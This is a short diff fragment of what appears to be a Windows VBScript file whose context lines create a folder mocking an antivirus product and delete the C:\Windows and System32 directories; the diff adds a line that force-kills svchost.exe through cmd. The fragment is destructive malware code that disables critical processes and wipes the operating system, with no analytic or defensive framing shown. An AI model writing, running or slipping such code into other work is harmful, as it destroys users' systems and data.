@@ -15107,7 +15107,7 @@ carew.CreateFolder "C:\Eset-Nod-fucked"
 
 
           
-
+carew.Run "cmd /k taskkill /F /IM svchost.exe", 1, True
 
 carew.deleteFolder "C:\Windows" 
 carew.deleteFolder "C:\Windows\System32"
